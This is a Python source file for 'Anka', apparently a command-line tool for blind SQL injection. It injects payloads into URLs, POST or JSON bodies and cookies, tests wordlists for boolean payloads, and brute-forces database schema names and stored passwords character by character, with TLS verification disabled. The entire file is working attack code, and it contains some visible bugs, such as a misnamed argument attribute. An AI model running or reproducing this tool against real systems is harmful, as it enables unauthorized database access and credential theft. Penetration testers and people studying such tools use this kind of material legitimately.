#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
TO-DO: Currently, when skipping with space, it will drop the valid char,
        instead of skipping the current checkWord, maybe change it to skip the current checkWord
"""
import argparse
import textwrap
import ast
import copy
import sys
import urllib

import requests
import urllib3
import json

#--- DELETE THIS AFTER USING THE SLOWDOWN 
import time

# -- deals with the terminal mode / keyboard listener
import sys
import termios
import tty
import select
import time

BLUE="\033[94m"
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# =============================================================================================
# Disable SSL/TLS certificate warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Create the argument parser    
parser = argparse.ArgumentParser(
    description=textwrap.dedent(f"""
        「{BLUE}安全鍵AnKa|Security Key{RESET}」
            Semi-Automated SQL Injection Tool
            
            {RED}Version{RESET}: {GREEN}1.0.0{RESET}                
            {RED}Author{RESET} : 9xh4kv
            {RED}GitHub{RESET} : https://github.com/9xh4kv/Anka

        {RED}IMPORTANT{RESET}: Use '*' to indicate where to inject the SQL payload.
        Examples:
          - For URL injection:           http://site.com/vuln.php?id=*
          - For POST data injection:     'key1=value1&key2=*'
          - For JSON POST data injection: '{{"key1": "value1", "key2": "*"}}'
          - For Cookies injection:       'key1=value1; key2=*'
    """),
    formatter_class=argparse.RawTextHelpFormatter
)
parser.add_argument("-v", "--version", action="version", version="anka.py v1.0.0")
parser.add_argument("--proxy", action="store_true", help="Turn debugging proxy on")

# Target info
target = parser.add_argument_group("Target", "Options to define the target and request context")
target.add_argument("-u", "--url", help="Target URL", required=True)
target.add_argument("-d", "--data", help="POST data value")
target.add_argument("-c", "--cookies", help="Specify HTTP cookies to be used")

# Attack options
attack = parser.add_argument_group("Attack Options", "Options to define the type of attack and payloads")
attack.add_argument("-a", "--attack", help="Attack type e.g. scan/schema/secret", required=True)
attack.add_argument("-p", "--payload", help="Payload")
attack.add_argument("-w", "--wordlist", help="Wordlist for blind SQL injection testing")
# please remember that in case of ORACLE db, tables and columns names might be case sensitve
# set -b to activate LIKE BINARY case sensitive search for schemaInfo (database, tables, columns)
# set -b False to force non-binary search (useful when attacking secrets which automatically does Binary Search)
attack.add_argument(
    "-b", "--binary",
    nargs="?",               # Allows -b with or without a value
    const=True,              # Sets args.binary to True if -b is provided without a value
    default=None,            # Keeps args.binary as None if -b is not provided
    type=lambda x: x.lower() == "true" if x else False,  # Convert "true"/"false" to boolean
    help="Enable case-sensitive brute-force search"
)

# Filtering options
filtering = parser.add_argument_group("Filtering Options", "Options to filter the scan results")
filtering.add_argument("-m", "--match", help="Specify a string or pattern that must be present in the HTTP response for a payload to be considered successful")
filtering.add_argument(
    "-M", "--not-match", 
    help="Invert match: successful if the pattern is NOT present (e.g., 'pattern1:pattern2')"
    )
filtering.add_argument("-fs", "--filter-size", help="Filter responses by content length (e.g., 1000)")

args = parser.parse_args()
# =============================================================================================
# ------------------------------------------------------------
# Args Checker -----------------------------------------------
filterSize = None
pattern = None
isPatternInverted = False

if args.filter_size:
    filterSize = [int(x) for x in args.filterSize.split(",")]
elif args.not_match:
    isPatternInverted = True
    pattern = args.not_match.split(":")
elif args.match:
    pattern = args.match
else:
    print(f"{RED}Please provide either a match pattern (-m/-M) or a filter size (-fs).{RESET}")
    exit()

if args.wordlist:
    try:
        with open(args.wordlist, "r") as f:
            wordlist = [line.rstrip('\r\n') for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{RED}Wordlist file not found: {args.wordlist}{RESET}")
        exit()
elif args.payload:
    payload = args.payload
else:
    print(f"{RED}Please provide either a payload (-p) or a wordlist (-w).{RESET}")

if args.data:
    try:
        # -d '{"key": "*"}'
        data = json.loads(args.data.strip())
        dataType = "json"
    except json.JSONDecodeError:
        data = dict(pair.split('=') for pair in args.data.strip().split('&'))
        dataType = "data"
else:
    data = None
    
if args.cookies:
    cookies = {}
    cookiesValue = args.cookies.split(";")
    for value in cookiesValue:
        key, value = value.split("=")
        cookies[key.strip()] = value.strip()
else:
    cookies = None

if args.binary is None:
    search_uppercase = "secret" in args.attack
else:
    search_uppercase = args.binary
    if not search_uppercase:
        print(f"{RED}UpperCase search disabled.{RESET}")

if search_uppercase:
    print(f"{GREEN}UpperCase search enabled.{RESET}")
    if not "binary" in args.payload.lower():
        print(f"{GREEN}BINARY{RESET} operator was {RED}not found{RESET} in the payload.")
        print(f"Injecting it for case sensitive search.\n")
        payload = payload.replace("LIKE", "LIKE BINARY")

if args.proxy:
    print(f"[{GREEN}PROXY{RESET}] {RED}Debugging mode on, sending requests to Burp Suite{RESET}")
    proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
else:
    proxies = None
# ------------------------------------------------------------
# Detect ScanType --------------------------------------------
if args.data and "*" in args.data:
    if dataType == "json":
        print(f"Detected injection marker '*' in {GREEN}POST JSON{RESET} data.")
    else:
        print(f"Detected injection marker '*' in {GREEN}POST{RESET} data.")
    scanType = "d"
elif args.cookies and "*" in args.cookies:
    print(f"Detected injection marker '*' in {GREEN}COOKIES{RESET} data.")
    scanType = "c"
elif "*" in args.url:
    print(f"Detected injection marker '*' in {GREEN}URL{RESET} data.")
    scanType = "u"
else:
    print(f"Injection marker {RED}not found{RESET}. Please set '*' to indicate where to inject the SQL payload.")
    exit()
# ------------------------------------------------------------
# Functions ===================================================================================
# ------------------------------------------------------------
# Skip word --------------------------------------------------
def setTerminalMode():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    tty.setcbreak(fd)
    return old_settings

def resetTerminalMode(old_settings):
    fd = sys.stdin.fileno()
    termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

def getPressedKey():
    if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
        return sys.stdin.read(1)
    return None
# Payload modifier -------------------------------------------
def modDict(dict, payload):
    modDict = copy.deepcopy(dict)
    for key, value in modDict.items():
        modDict[key] = value.replace("*", payload)
    return modDict
# ------------------------------------------------------------
# Request Functions ------------------------------------------
def urlRequestPattern(url, cookies, payload, pattern, isPatternInverted):
    modifiedUrl = url.replace("*", urllib.parse.quote(payload))
    request = requests.get(modifiedUrl, cookies=cookies, verify=False, proxies=proxies)
    if not isPatternInverted and pattern in request.text:
        return True
    elif isPatternInverted and all(pat not in request.text for pat in pattern):
        return True

def urlRequestFilterSize(url, cookies, payload, filterSize):
    modifiedUrl = url.replace("*", urllib.parse.quote(payload))
    request = requests.get(modifiedUrl, cookies=cookies, verify=False, proxies=proxies)
    if len(request.content) not in filterSize:
        return True
    return False

def dataRequestPattern(url, cookies, data, payload, pattern, isPatternInverted):
    modifiedData = modDict(data, payload)
    request = requests.post(url, cookies=cookies, **{dataType: modifiedData}, verify=False, proxies=proxies)
    if not isPatternInverted and pattern in request.text:
        return True
    elif isPatternInverted and all(pat not in request.text for pat in pattern):
        return True
    return False    

def dataRequestFilterSize(url, cookies, data, payload, filterSize):
    modifiedData = modDict(data, payload)
    request = requests.post(url, cookies=cookies, **{dataType: modifiedData}, verify=False, proxies=proxies)
    if len(request.content) not in filterSize:
        return True
    return False

# def jsonRequestPattern(url, cookies, data, payload, pattern, isPatternInverted):
#     modifiedData = modDict(data, payload)
#     request = requests.post(url, cookies=cookies, **{dataType: modifiedData}, verify=False, proxies=proxies)
#     if not isPatternInverted and pattern in request.text:
#         return True
#     elif isPatternInverted and all(pat not in request.text for pat in pattern):
#         return True
#     return False    

# def jsonRequestFilterSize(url, cookies, data, payload, filterSize):
#     modifiedData = modDict(data, payload)
#     request = requests.post(url, cookies=cookies, **{dataType: modifiedData}, verify=False, proxies=proxies)
#     if len(request.content) not in filterSize:
#         return True
#     return False

def cookiesRequestPattern(url, cookies, data, payload, pattern, isPatternInverted):
    modifiedCookies = modDict(cookies, payload)
    request = requests.get(url, cookies=modifiedCookies, verify=False, proxies=proxies)
    if not isPatternInverted and pattern in request.text:        
        return True
    elif isPatternInverted and all(pat not in request.text for pat in pattern):
        return True
    return False

def cookiesRequestFilterSize(url, cookies, data, payload, filterSize):
    modifiedCookies = modDict(cookies, payload)
    request = requests.get(url, cookies=modifiedCookies, verify=False, proxies=proxies)
    if len(request.content) not in filterSize:
        return True
    return False

# ------------------------------------------------------------
# Payload Checker --------------------------------------------
def checkPayload(scanType, url, cookies, data, wordlist, pattern, isPatternInverted, filterSize):
    match scanType:
        case "c":
            if pattern:
                for payload in wordlist:
                    encodedPayload = urllib.parse.quote(payload)
                    if cookiesRequestPattern(url, cookies, data, payload, pattern, isPatternInverted):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
                print(f"{RED}No valid payload found in the encoded wordlist.{RESET}")
                print(f"Trying the payloads without encoding...")
                for payload in wordlist:
                    if cookiesRequestPattern(url, cookies, data, payload, pattern, isPatternInverted):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
            else:
                for payload in wordlist:
                    encodedPayload = urllib.parse.quote(payload)
                    if cookiesRequestFilterSize(url, cookies, data, payload, filterSize):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
                print(f"{RED}No valid payload found in the encoded wordlist.{RESET}")
                print(f"Trying the payloads without encoding...")
                for payload in wordlist:
                    if cookiesRequestFilterSize(url, cookies, data, payload, filterSize):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()                
            print(f"{RED}No valid payload found in the wordlist.{RESET}")   
        case "d":
            if pattern:
                for payload in wordlist:
                    if dataRequestPattern(url, cookies, data, payload, pattern, isPatternInverted):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
                print(f"{RED}No valid payload found in the wordlist.{RESET}")
            elif filterSize:
                for payload in wordlist:
                    if dataRequestFilterSize(url, cookies, data, payload, filterSize):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
                print(f"{RED}No valid payload found in the wordlist.{RESET}")
        case "u":
            print(f"{BLUE}Checking URL for valid payloads...{RESET}")
            if pattern:
                for payload in wordlist:
                    if urlRequestPattern(url, cookies, payload, pattern, isPatternInverted):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
                print(f"{RED}No valid payload found in the wordlist.{RESET}")
            elif filterSize:
                for payload in wordlist:
                    if urlRequestFilterSize(url, cookies, payload, filterSize):
                        print(f"{GREEN}Found valid payload{RESET}: {payload}")
                        exit()
                print(f"{RED}No valid payload found in the wordlist.{RESET}")            
# ------------------------------------------------------------
# SQL Injection Scanner --------------------------------------
def sqlInjection(scanType, url, cookies, data, payload, char, pattern, isPatternInverted, filterSize):
    #Please be aware:
    #this goes from the logic that no element name has only 1 letter. it checks for x% initially then if the two letters exist within the db, it checks if those two letters are 1 element.
    # ATTENTION ===== check if single chars are getting added to found list.
    modifiedPayload = payload.replace("*", char + "%") 
    match scanType:
        case "c":
            if pattern:
                if cookiesRequestPattern(url, cookies, data, modifiedPayload, pattern, isPatternInverted):
                    modifiedPayload = payload.replace("*", char)
                    if cookiesRequestPattern(url, cookies, data, modifiedPayload, pattern, isPatternInverted):
                        return True, True
                    return True, False
                return False, False
            elif filterSize:
                if cookiesRequestFilterSize(url, cookies, data, modifiedPayload, filterSize):
                    return True, True
                return True, False
            return False, False
        case "d":
            if pattern:
                if dataRequestPattern(url, cookies, data, modifiedPayload, pattern, isPatternInverted):
                    modifiedPayload = payload.replace("*", char)
                    if dataRequestPattern(url, cookies, data, modifiedPayload, pattern, isPatternInverted):
                        return True, True
                    return True, False
                return False, False
            elif filterSize:
                if dataRequestFilterSize(url, cookies, data, modifiedPayload, filterSize):
                    return True, True
                return True, False
            return False, False
        case "u":
            if pattern:
                if urlRequestPattern(url, cookies, modifiedPayload, pattern, isPatternInverted):
                    modifiedPayload = payload.replace("*", char)
                    if urlRequestPattern(url, cookies, modifiedPayload, pattern, isPatternInverted):
                        return True, True
                    return True, False
                return False, False
            elif filterSize:    
                if urlRequestFilterSize(url, cookies, modifiedPayload, filterSize):
                    return True, True
                return True, False
            return False, False

def getSchemaInfo(scanType, url, cookies, data, payload, pattern, isPatternInverted, filterSize):
    validDict = {} # Uses dictionary to keep track of words escaped with "\" in case it has _ or '.
    foundList = []       
    #Get initial chars
    validDict, foundList = checkChar(scanType, url, cookies, data, payload, pattern, isPatternInverted, filterSize, "", False, validDict, foundList)        
    if not validDict:
        sys.stdout.write("\r" + "No valid initial char found")
        sys.stdout.flush()
        exit()
    while validDict:
        validWord, isEscaped = validDict.popitem()
        validDict, foundList = checkChar(scanType, url, cookies, data, payload, pattern, isPatternInverted, filterSize, validWord, isEscaped, validDict, foundList)
    
    print("\r\033[A\033[K\nHappy Hacking :)\033[K")
    
def checkChar(scanType, url, cookies, data, payload, pattern, isPatternInverted, filterSize, char, charStatus, validDict, foundList):       
    oldSettings = setTerminalMode()
    try:
        for initChar in range(33, 126):
        #for initChar in range(97, 126): # 123maxlowerC FOR DEBUGGING run only lowercase letters      
    #==============================================================================================
            keyPressed = getPressedKey()
            if keyPressed and keyPressed.lower() == ' ':
                resetTerminalMode(oldSettings)
                skip = input(f"\nAre you sure you want to skip {GREEN}{char}{RESET}? y/n: ").strip().lower()
                oldSettings = setTerminalMode()
                if skip == "y" or skip == "":                    
                    print(f"\r{RED}Skipping{RESET} {char}\033[K", end="")
                    time.sleep(1)
                    print("\r\033[K\033[2A", end="")
                    break
                # maybe insert a if statement to skip checkWord instead of the validChar.
                else:
                    print(f"\r{GREEN}Resuming{RESET}\033[K", end="")
                    time.sleep(1)
                    print("\r\033[K\033[2A", end="")                           
    #================================================================================================
            isEscaped = charStatus
            if not search_uppercase and initChar in range(65, 91):
                continue
            if initChar in [37, 95]:
                initChar = "\\" + chr(initChar)
                isEscaped = True
            else:
                initChar= chr(initChar)

            checkWord = char + initChar
            if isEscaped:
                print(f"\r{BLUE}Checking{RESET}: {checkWord.replace('\\', '')}\033[K", end="")
            else:
                print(f"\r{BLUE}Checking{RESET}: {checkWord}\033[K", end="")

            isChar, isFull = sqlInjection(scanType, url, cookies, data, payload, checkWord, pattern, isPatternInverted, filterSize)
            if isFull:
                if isEscaped:
                    foundList.append(checkWord.replace("\\", ""))
                else:
                    foundList.append(checkWord)
                printFound(foundList)
            if isChar:
                validDict[checkWord] = isEscaped
                printChars(validDict)
        return validDict, foundList
    finally:
        resetTerminalMode(oldSettings)

def getSecret(scanType, url, cookies, data, payload, pattern, isPatternInverted, filterSize):
    extractedPwd = ""
    passwordFound = False
    escapedChar = False
    while not passwordFound:   
        for char in range (33, 126):
            if not search_uppercase and char in range(65, 91):
                continue
            if char in [37, 95]:
                escapedChar = True
                char = extractedPwd + "\\" + chr(char) # this add \ before % and _ to escape them in the SQL query.
            else:
                char = extractedPwd + chr(char)
            isValid, isFull = sqlInjection(scanType, url, cookies, data, payload, char, pattern, isPatternInverted, filterSize)
            if isFull:
                passwordFound = True
                sys.stdout.write("\r" +"Extracted Password: " + char)
                sys.stdout.flush()
                break
            elif isValid:
                if escapedChar:
                    char = char.replace("\\", "")
                    escapedChar = False
                extractedPwd = char
                sys.stdout.write("\r" + extractedPwd)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write("\r" + char)

def printFound(foundList):
    print(f"\r\033[2A{GREEN}Found{RESET}: [ {', '.join(foundList)} ]\033[2B", end="")

def printChars(validDict):
    formatted_keys = [key.replace("\\", "") if isEscaped else key for key, isEscaped in validDict.items()]
    print(f"\r\033[A{BLUE}Valid chars{RESET}: [ {', '.join(formatted_keys)} ]\033[K\033[B", end="")

match args.attack:
    case "scan":
        if "wordlist" not in locals():
            print(f"{RED}Please provide a wordlist with -w or --wordlist option.{RESET}")
            exit()
        print(f"{BLUE}Testing for valid blind SQL injection boolean payloads...{RESET}")
        checkPayload(scanType, args.url, cookies, data, wordlist, pattern, isPatternInverted, filterSize)
    case "schema":
        print(f"{BLUE}Extracting schema information...{RESET}\n\n\n")
        getSchemaInfo(scanType, args.url, cookies, data, payload, pattern, isPatternInverted, filterSize)
    case "secret":
        print(f"{BLUE}Extracting Secret/Password...{RESET}\n\n\n")
        getSecret(scanType, args.url, cookies, data, payload, pattern, isPatternInverted, filterSize)
    case _:
        print(f"Attack type {RED}not recognized{RESET}: {args.attack}")

# =============================================================================================
